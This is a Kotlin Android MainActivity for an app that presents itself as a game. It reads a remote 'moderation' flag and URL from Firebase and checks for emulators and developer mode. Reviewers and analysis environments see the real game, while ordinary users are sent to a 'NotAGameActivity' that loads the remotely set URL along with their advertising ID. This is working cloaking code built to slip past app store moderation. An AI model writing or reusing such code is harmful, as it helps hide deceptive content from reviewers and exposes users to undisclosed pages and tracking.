package com.stral.dbldwn

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject


class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val sharedPref = getSharedPreferences(
            getString(R.string.prefs_key), Context.MODE_PRIVATE
        )

        if (sharedPref.getString(SAVED_URL, "null") == "null" ||
            sharedPref.getString(SAVED_MODERATION, "null") == "null"
        ) {
            FirebaseUtil.fetchConfig(this) {
                it?.let { config ->
                    val rawJsonConfig = config.getValue("Down").asString()
                    val json = JSONObject(rawJsonConfig)
                    val moderation = json.getBoolean("date")
                    val url = json.getString("what")
                    val editor = sharedPref.edit()
                    editor.putString(SAVED_MODERATION, moderation.toString())
                    editor.putString(SAVED_URL, url)
                    editor.apply()
                    runFlow(moderation.toString(), url)
                } ?: run {
                    Toast.makeText(this, "No internet", Toast.LENGTH_SHORT).show()
                }
            }
        } else {
            val url = sharedPref.getString(SAVED_URL, "null")
            val moderation = sharedPref.getString(SAVED_MODERATION, "null")
            runFlow(moderation, url)
        }
    }

    private fun runFlow(moderation: String?, url: String?) {
        if ((moderation == "true") || isEmulator || isDevMode(this)) {
            val intent = Intent(this, GameActivity::class.java)
            startActivity(intent)
        } else {
            val intent = Intent(this, NotAGameActivity::class.java)
            intent.putExtra("URL", url)
            intent.putExtra("APP_INSTANCE_ID", App.appInstanceId)
            intent.putExtra("ADVERTISING_ID", App.appUUID)
            startActivity(intent)
        }
        finish()
    }

    private val isEmulator: Boolean
        get() = (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("google_sdk")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("sdk_x86")
                || Build.PRODUCT.contains("sdk_gphone64_arm64")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator")
                || Build.PRODUCT.contains("simulator");


    fun isDevMode(context: Context): Boolean {
        return Settings.Secure.getInt(
            context.contentResolver,
            Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
        ) != 0
    }

    companion object {
        const val SAVED_URL = "SAVED_URL"
        const val SAVED_MODERATION = "SAVED_MODERATION"
    }
}